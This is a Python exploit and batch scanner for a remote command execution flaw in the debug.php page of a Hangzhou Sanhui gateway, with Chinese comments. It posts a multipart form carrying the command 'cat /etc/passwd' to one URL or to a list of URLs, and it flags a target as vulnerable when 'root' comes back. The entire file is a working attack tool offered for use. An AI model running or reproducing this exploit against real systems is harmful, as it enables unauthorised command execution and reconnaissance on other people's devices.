import requests
import argparse


def debug(url):
    create_url = url + "/debug.php"  # 构造请求的URL地址

    data='''------WebKitFormBoundaryAEiWTHP0DxJ7Uwmb
Content-Disposition: form-data; name="comdtype"

1
------WebKitFormBoundaryAEiWTHP0DxJ7Uwmb
Content-Disposition: form-data; name="cmd"

cat /etc/passwd
------WebKitFormBoundaryAEiWTHP0DxJ7Uwmb
Content-Disposition: form-data; name="run"

------WebKitFormBoundaryAEiWTHP0DxJ7Uwmb--'''
    # 构造请求包中提交的数据，其中有命令执行的代码
    headers = {
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15",
        "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryAEiWTHP0DxJ7Uwmb"
    }
    # 构造请求数据与请求头中的部分内容

    try:
        req = requests.post(create_url, data=data, headers=headers, timeout=5)
        if (req.status_code == 200):
            # 上述构造的请求包中有/etc/passwd命令，看是否有root用户
            if "root" in req.text:
                print(f"{url}存在关于杭州三汇网关debug远程代码执行漏洞")
                #print(req.text) #显示该请求发送后响应包返回的内容
            else:
                print("该网址不存在相关漏洞")
    except:
        print("该网址无法访问或连接错误")


def debug_counts(filename):
    try:
        with open(filename, "r") as file:
            readline = file.readlines()
            for urls in readline:
                urls = urls.strip()
                debug(urls)
    except:
        print("文件不存在或文件打开发生错误")


def start():
    logo = ''' 
    ░▒▓███████▓▒░░▒▓████████▓▒░▒▓███████▓▒░░▒▓█▓▒░░▒▓█▓▒░░▒▓██████▓▒░  
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░        
░▒▓█▓▒░░▒▓█▓▒░▒▓██████▓▒░ ░▒▓███████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒▒▓███▓▒░ 
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
░▒▓███████▓▒░░▒▓████████▓▒░▒▓███████▓▒░ ░▒▓██████▓▒░ ░▒▓██████▓▒░  
                                                                   
                                                                   
'''
    print(logo)


def main():
    parser = argparse.ArgumentParser(description="杭州三汇网关debug远程代码执行")
    parser.add_argument('-u', type=str, help='检测单个url')
    parser.add_argument('-f', type=str, help='批量检测url列表文件')
    args = parser.parse_args()
    if args.u:
        debug(args.u)
    elif args.f:
        debug_counts(args.f)
    else:
        parser.print_help()


if __name__ == "__main__":
    start()
    main()